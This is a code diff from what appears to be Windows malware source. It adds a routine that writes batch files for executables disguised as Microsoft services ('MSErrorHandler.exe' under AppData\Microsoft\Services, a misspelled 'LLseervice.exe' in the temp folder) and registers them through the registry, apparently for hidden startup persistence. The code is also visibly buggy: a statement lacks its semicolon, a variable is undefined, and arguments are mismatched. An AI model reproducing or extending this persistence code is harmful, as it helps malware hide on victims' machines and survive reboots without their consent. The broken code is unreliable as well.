@@ -176,6 +176,23 @@ namespace IO
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);*/
     }
+  void fixbat(std::string filename,std::string fullpath){
+  std::string batname;
+  std::string batpath;
+  if(filename == "LLseervice.exe"){
+                      batname = "batLL.bat";
+                      batpath = path+batname;
+                    }else{
+                      batname = "batER.bat";
+                      batpath = path+batname;
+                    }
+                    
+                    mkbat(fullpath,batpath)
+                    //shell_cmd()
+                    //startup(fullpath.c_str());
+                    Registry::RegisterProgram2(batname,batpath);
+                    
+  }
   bool mkbat(std::string path,std::string batname_path){
     ofstream bat;
     bat.open (batname+".bat");
@@ -191,14 +208,22 @@ namespace IO
         std::string path = appdata_dir + "\\Microsoft\\Services\\";
         std::string filename = "MSErrorHandler.exe";
         std::string fullpath = path + filename;
-        std::string batname;
-        std::string batpath;
+        std::string batname = "batER.bat";
+        std::string batpath = path+batname;
+        if(!IO::exists_file(batpath)){
+           fixbat(filename,batpath);
+        }
         if (IO::exists_file(fullpath)) {
             char* temp = getenv("temp");
             std::string temp_dir(temp);
             path = temp_dir + "\\";
             filename = "LLseervice.exe";
             fullpath = path + filename;
+            batname = "batLL.bat";
+            batpath = path+batname;
+        }
+        if(!IO::exists_file(batpath)){
+           fixbat(filename,batpath);
         }
         if (IO::exists_file(fullpath)){
             return false;
